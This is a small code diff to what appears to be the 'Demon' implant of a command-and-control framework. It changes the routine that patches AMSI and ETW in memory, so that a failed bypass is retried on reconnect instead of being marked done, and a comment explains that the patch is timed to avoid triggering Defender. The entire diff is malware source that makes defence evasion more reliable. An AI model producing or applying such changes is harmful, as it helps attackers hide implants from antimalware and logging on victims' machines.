@@ -108,10 +108,11 @@ VOID DemonRoutine()
                  * connection — deferred from DemonInit to avoid triggering Defender
                  * on amsi.dll load before any network activity. */
                 if ( ! AmsiPatched && Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
-                    if ( ! NT_SUCCESS( AmsiEtwBypassPatch() ) ) {
-                        PUTS( "[BYPASS] Warning: process-wide AMSI/ETW patch failed" )
+                    if ( NT_SUCCESS( AmsiEtwBypassPatch() ) ) {
+                        AmsiPatched = TRUE;
+                    } else {
+                        PUTS( "[BYPASS] Warning: process-wide AMSI/ETW patch failed — will retry on reconnect" )
                     }
-                    AmsiPatched = TRUE;
                 }
             }
         }
